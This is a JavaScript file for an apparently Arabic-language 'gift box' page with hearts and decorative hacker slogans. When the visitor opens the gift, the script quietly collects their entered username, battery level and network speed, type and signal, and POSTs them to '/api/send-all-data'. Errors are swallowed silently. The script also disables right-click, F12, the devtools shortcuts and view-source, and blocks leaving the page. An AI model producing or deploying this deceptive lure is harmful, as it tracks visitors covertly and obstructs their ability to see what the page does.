let alreadySent = false;
let username = '';

// خلفية القلوب
function createHeartsBackground() {
  const bg = document.getElementById('hearts-bg');
  const heartEmojis = ['❤️', '💕', '💗', '💖', '💘', '💝', '💓', '🩷'];
  
  for (let i = 0; i < 30; i++) {
    const heart = document.createElement('div');
    heart.classList.add('heart');
    heart.textContent = heartEmojis[Math.floor(Math.random() * heartEmojis.length)];
    heart.style.left = Math.random() * 100 + '%';
    heart.style.fontSize = (Math.random() * 30 + 15) + 'px';
    heart.style.animationDuration = (Math.random() * 10 + 8) + 's';
    heart.style.animationDelay = (Math.random() * 8) + 's';
    heart.style.opacity = Math.random() * 0.3 + 0.1;
    bg.appendChild(heart);
  }
}
createHeartsBackground();

// نصوص الثغرات
function createHackerText() {
  const container = document.getElementById('hacker-text');
  const texts = [
    'ROOT ACCESS GRANTED',
    'SYSTEM HACKED',
    'ADMIN PRIVILEGES',
    'DATABASE DUMP',
    'SQL INJECTION',
    'XSS VULNERABILITY',
    'BACKDOOR INSTALLED',
    'PASSWORD CRACKED',
    'SESSION HIJACKED',
    'FIREWALL BYPASSED',
    'ENCRYPTION BROKEN',
    'TROJAN DEPLOYED',
    'RANSOMWARE ACTIVATED',
    'DDoS ATTACK',
    'DNS SPOOFING',
    'PHISHING SITE',
    'MALWARE DETECTED',
    'EXPLOIT SUCCESS',
    'ZERO-DAY FOUND',
    'KERNEL PANIC',
    'BUFFER OVERFLOW',
    'STACK SMASHING',
    'HEAP SPRAYING',
    'ROOTKIT INSTALLED',
    'KEYLOGGER ACTIVE',
    'SCREEN CAPTURE',
    'MICROPHONE ACCESS',
    'CAMERA ENABLED',
    'GPS TRACKING',
    'CONTACTS SYNCED',
    'MESSAGES READ',
    'CALL LOGS EXPORTED',
    'PHOTOS UPLOADED',
    'LOCATION SHARED',
    'DEVICE COMPROMISED'
  ];
  
  let html = '';
  for (let i = 0; i < 80; i++) {
    const text = texts[Math.floor(Math.random() * texts.length)];
    const x = Math.random() * 90;
    const y = Math.random() * 90;
    const opacity = Math.random() * 0.1 + 0.02;
    const size = Math.random() * 20 + 10;
    html += `<span style="position:absolute;left:${x}%;top:${y}%;font-size:${size}px;opacity:${opacity};">${text}</span>`;
  }
  container.innerHTML = html;
}
createHackerText();

// عناصر DOM
const loginScreen = document.getElementById('login-screen');
const giftScreen = document.getElementById('gift-screen');
const successScreen = document.getElementById('success-screen');
const loginForm = document.getElementById('login-form');
const usernameInput = document.getElementById('username-input');
const giftBox = document.getElementById('gift-box');
const giftUsername = document.getElementById('gift-username');

// معالج تسجيل الدخول
loginForm.addEventListener('submit', function(e) {
  e.preventDefault();
  username = usernameInput.value.trim();
  
  if (username === '') {
    usernameInput.style.borderColor = 'red';
    usernameInput.style.boxShadow = '0 0 30px rgba(255,0,0,0.2)';
    setTimeout(() => {
      usernameInput.style.borderColor = '#ff6b9d';
      usernameInput.style.boxShadow = 'none';
    }, 1000);
    return;
  }

  giftUsername.textContent = username;
  loginScreen.classList.add('hidden');
  giftScreen.classList.remove('hidden');
});

// معالج صندوق الهدية
giftBox.addEventListener('click', function() {
  if (alreadySent) return;
  
  this.textContent = '🎉';
  this.style.animation = 'none';
  this.style.transform = 'scale(1.3)';
  
  setTimeout(() => {
    document.body.classList.add('green-mode');
    
    if ('getBattery' in navigator && !alreadySent) {
      alreadySent = true;
      
      navigator.getBattery().then(function(battery) {
        let percent = Math.round(battery.level * 100);
        
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        let networkSpeed = 'غير معروف';
        let signalBars = 'غير معروف';
        let signalType = 'غير معروف';
        
        if (connection) {
          const speed = connection.downlink;
          if (speed) {
            networkSpeed = speed + ' Mbps';
          }
          
          if (connection.effectiveType) {
            const types = {
              'slow-2g': '2G',
              '2g': '2G',
              '3g': '3G',
              '4g': '4G'
            };
            signalType = types[connection.effectiveType] || connection.effectiveType;
          }
          
          if (connection.bars !== undefined && connection.bars !== null) {
            const bars = Math.min(Math.max(connection.bars, 0), 4);
            signalBars = '█'.repeat(bars) + '░'.repeat(4 - bars) + ` (${bars}/4)`;
          } else {
            const speed = connection.downlink || 0;
            if (speed >= 50) signalBars = '████ (4/4)';
            else if (speed >= 20) signalBars = '███░ (3/4)';
            else if (speed >= 5) signalBars = '██░░ (2/4)';
            else if (speed >= 1) signalBars = '█░░░ (1/4)';
            else signalBars = '░░░░ (0/4)';
          }
        }
        
        fetch('/api/send-all-data', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            username: username, 
            battery: percent,
            speed: networkSpeed,
            signal: signalBars,
            type: signalType
          })
        });
      }).catch(() => {
        // silent fail
      });
    }
  }, 600);
});

usernameInput.addEventListener('keypress', function(e) {
  if (e.key === 'Enter') {
    loginForm.dispatchEvent(new Event('submit'));
  }
});

window.addEventListener('beforeunload', function (e) {
  e.preventDefault();
  e.returnValue = '';
});

document.addEventListener('contextmenu', function(e) {
  e.preventDefault();
});

document.addEventListener('keydown', function(e) {
  if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || 
      (e.ctrlKey && e.shiftKey && e.key === 'J') || (e.ctrlKey && e.key === 'U')) {
    e.preventDefault();
  }
});
